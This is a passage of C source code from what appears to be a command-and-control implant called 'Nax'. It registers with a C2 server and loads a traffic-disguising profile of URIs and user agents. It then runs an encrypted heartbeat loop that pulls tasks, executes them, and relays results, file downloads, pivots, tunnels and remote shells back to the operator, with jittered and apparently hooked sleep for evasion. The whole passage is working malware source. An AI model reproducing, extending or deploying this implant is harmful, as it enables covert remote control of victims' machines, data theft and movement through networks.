        if ( NaxDecrypt( Nax, resp_h, resp_len, plain_h, &prof_plain_len ) != NAX_OK || prof_plain_len < NAX_FRAME_HDR ) {
            NaxDbg( Nax, "REGISTER response invalid (decrypt failed)" );
            Nax->Kernel32.Sleep( Nax->Config.SleepMs );
            continue;
        }

        BYTE pft = 0; PBYTE pfb = NULL; UINT32 pfbl = 0;
        if ( NaxFrameDecode( plain_h, prof_plain_len, &pft, &pfb, &pfbl ) != NAX_OK ) {
            NaxDbg( Nax, "REGISTER response invalid (bad frame)" );
            Nax->Kernel32.Sleep( Nax->Config.SleepMs );
            continue;
        }

        if ( pft == NAX_WIRE_PROFILE ) {
            NaxDbg( Nax, "PROFILE frame received, body=%u bytes", pfbl );
            NaxApplyProfile( Nax, pfb, pfbl );
            NaxDbg( Nax, "profile v%d loaded: %d GET URIs, %d POST URIs, ua=%s, rotation=%d", Nax->Config.ProfileVersion, Nax->Config.GetUriCount, Nax->Config.PostUriCount, Nax->Config.UserAgent, Nax->Config.Rotation );
            if ( Nax->Config.GetUriCount > 0 ) NaxDbg( Nax, "  GET[0]=%s", Nax->Config.GetUris[0] );
            NaxDbg( Nax, "  GET meta: fmt=%d mask=%d place=%d name=%s", Nax->Config.GetClientMeta.Format, Nax->Config.GetClientMeta.Mask, Nax->Config.GetClientMeta.Placement, Nax->Config.GetClientMeta.Name );
            NaxDbg( Nax, "  GET hdrCount=%d", Nax->Config.GetClientHdrCount );
            if ( Nax->Config.GetClientHdrCount > 0 ) NaxDbg( Nax, "  GET hdr[0]=%s", Nax->Config.GetClientHdrs[0] );
            NaxDbg( Nax, "  POST meta: fmt=%d mask=%d place=%d name=%s", Nax->Config.PostClientMeta.Format, Nax->Config.PostClientMeta.Mask, Nax->Config.PostClientMeta.Placement, Nax->Config.PostClientMeta.Name );
            NaxDbg( Nax, "  POST out: fmt=%d mask=%d place=%d prepLen=%d appLen=%d", Nax->Config.PostClientOutput.Format, Nax->Config.PostClientOutput.Mask, Nax->Config.PostClientOutput.Placement, Nax->Config.PostClientOutput.PrependLen, Nax->Config.PostClientOutput.AppendLen );
            if ( Nax->Config.PostUriCount > 0 ) NaxDbg( Nax, "  POST[0]=%s", Nax->Config.PostUris[0] );
        }
        break;
    }
    NaxDbg( Nax, "REGISTER confirmed" );

    BOOL pendingPivotDrain = FALSE;

    /* ---- heartbeat loop ---- */
    for ( ;; ) {
        NaxRotateHost( Nax, c2_url_w, 128 );
        frame_len = FRAME_CAP;
        if ( NaxBuildHeartbeat( frame_h, &frame_len ) != NAX_OK ) continue;

        env_len = FRAME_CAP;
        if ( NaxEncrypt( Nax, frame_h, frame_len, env_h, &env_len ) != NAX_OK ) continue;

        resp_len = IO_CAP;
        Nax->DynResp    = NULL;
        Nax->DynRespLen = 0;

        if ( NaxSendHeartbeat( Nax, c2_url_w, Nax->SessionId, env_h, env_len, resp_h, &resp_len ) != NAX_OK ) continue;

        PBYTE  use_resp     = resp_h;
        UINT32 use_resp_len = resp_len;
        PBYTE  dyn_plain    = NULL;

        if ( Nax->DynResp ) {
            use_resp     = Nax->DynResp;
            use_resp_len = Nax->DynRespLen;
        }

        if ( use_resp_len == 0 ) {
            if ( Nax->DynResp ) { Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, Nax->DynResp ); Nax->DynResp = NULL; }
            continue;
        }

        PBYTE  use_plain     = plain_h;
        UINT32 use_plain_cap = IO_CAP;

        if ( use_resp_len > IO_CAP ) {
            dyn_plain = (PBYTE)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, use_resp_len );
            if ( !dyn_plain ) {
                if ( Nax->DynResp ) { Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, Nax->DynResp ); Nax->DynResp = NULL; }
                continue;
            }
            use_plain     = dyn_plain;
            use_plain_cap = use_resp_len;
        }

        UINT32 plain_len = use_plain_cap;
        if ( NaxDecrypt( Nax, use_resp, use_resp_len, use_plain, &plain_len ) != NAX_OK ) {
            if ( dyn_plain )     Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, dyn_plain );
            if ( Nax->DynResp ) { Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, Nax->DynResp ); Nax->DynResp = NULL; }
            continue;
        }

        if ( Nax->DynResp ) {
            Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, Nax->DynResp );
            Nax->DynResp    = NULL;
            Nax->DynRespLen = 0;
        }

        PBYTE  cursor       = use_plain;
        UINT32 remaining    = plain_len;
        BOOL   hadTasks     = FALSE;

        while ( remaining >= NAX_FRAME_HDR ) {
            BYTE   ft = 0; PBYTE fb = NULL; UINT32 fbl = 0;
            if ( NaxFrameDecode( cursor, remaining, &ft, &fb, &fbl ) != NAX_OK ) break;

            UINT32 step = NAX_FRAME_HDR + fbl;
            if ( step > remaining ) break;
            cursor    += step;
            remaining -= step;

            if ( ft == NAX_WIRE_NO_TASKS ) break;
            if ( ft != NAX_WIRE_TASK ) continue;

            NAX_TASK task;
            if ( NaxDecodeTask( fb, fbl, &task ) != NAX_OK ) {
                NaxDbg( Nax, "[task] decode FAILED fbl=%u", fbl );
                continue;
            }
            NaxDbg( Nax, "[task] cmd=0x%02x id=0x%08x argsLen=%u", task.CmdId, task.TaskId, task.ArgsLen );
            hadTasks = TRUE;

            UINT32 r_tid  = 0;
            BYTE   r_stat = 0;
            UINT32 r_len  = RESULT_CAP;

            if ( ! NaxDispatch( Nax, &task, &r_tid, &r_stat, result_h, &r_len ) ) {
                NaxDbg( Nax, "[task] cmd=0x%02x: no result (exit)", task.CmdId );
                continue;
            }

            NaxDbg( Nax, "[task] cmd=0x%02x done: stat=0x%02x r_len=%u", task.CmdId, r_stat, r_len );
            INT rc = HttpSendResult( Nax, r_tid, r_stat, result_h, r_len, frame_h, FRAME_CAP, env_h, FRAME_CAP, c2_url_w, resp_h, IO_CAP );
            NaxDbg( Nax, "[task] result sent rc=%d", rc );
        }

        if ( dyn_plain ) {
            Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, dyn_plain );
            dyn_plain = NULL;
        }

        {
            NAX_PIVOT* _pv = Nax->PivotHead;
            while ( _pv ) {
                if ( _pv->Async->DataSent )
                    pendingPivotDrain = TRUE;
                _pv = _pv->Next;
            }
        }

        if ( Nax->PivotHead )
            HttpRelayPivots( Nax, result_h, RESULT_CAP, frame_h, FRAME_CAP, env_h, FRAME_CAP, c2_url_w, resp_h, IO_CAP );

        if ( Nax->DownloadHead )
            HttpRelayDownloads( Nax, result_h, RESULT_CAP, frame_h, FRAME_CAP, env_h, FRAME_CAP, c2_url_w, resp_h, IO_CAP );

        if ( Nax->JobHead )
            HttpRelayJobs( Nax, result_h, RESULT_CAP, frame_h, FRAME_CAP, env_h, FRAME_CAP, c2_url_w, resp_h, IO_CAP );

        if ( Nax->TunnelHead )
            HttpRelayTunnels( Nax, result_h, RESULT_CAP, frame_h, FRAME_CAP, env_h, FRAME_CAP, c2_url_w, resp_h, IO_CAP );

        if ( Nax->ShellHead )
            HttpRelayShells( Nax, result_h, RESULT_CAP, frame_h, FRAME_CAP, env_h, FRAME_CAP, c2_url_w, resp_h, IO_CAP );

        if ( hadTasks ) {
            NaxDbg( Nax, "[HB] burst: re-checking for tasks" );
            continue;
        }

        UINT32 eff_sleep = NaxEffectiveSleep( Nax );
        if ( pendingPivotDrain && Nax->PivotHead ) {
            pendingPivotDrain = FALSE;
            NaxDbg( Nax, "[HB] pivot drain: fast heartbeat (100 ms)" );
            Nax->Kernel32.Sleep( 100 );
            continue;
        } else {
            NaxDbg( Nax, "[HB] sleeping %lu ms (base=%lu jitter=%u%%) Sleep=%p GateOrig=%p Gate=%p",
                    eff_sleep, Nax->Config.SleepMs, Nax->Config.JitterPct,
                    (PVOID)Nax->Kernel32.Sleep, Nax->GateOriginals.Sleep, Nax->Gate );
            Nax->Kernel32.Sleep( eff_sleep );
        }
    }
}
